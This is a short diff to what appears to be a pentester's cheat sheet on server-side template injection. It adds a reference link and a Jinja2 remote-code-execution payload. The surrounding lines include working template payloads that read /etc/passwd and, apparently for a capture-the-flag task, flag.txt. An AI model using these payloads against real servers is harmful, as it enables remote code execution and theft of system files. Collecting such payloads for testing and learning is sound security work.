@@ -439,6 +439,7 @@ https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti
 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf  
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection  
 http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine  
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  
 
 ```
 {% import os %}{{ os.popen("cat /etc/passwd").read() }}
@@ -460,6 +461,9 @@ Executing SSTI as fragments using variables:
 
 Executing SSTI as a list:
 {"verb":["{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"],"noun":"test","adjective":"test","person":"test","place":"test"}
+
+Jinja2 - Remote Code Execution
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
 
 
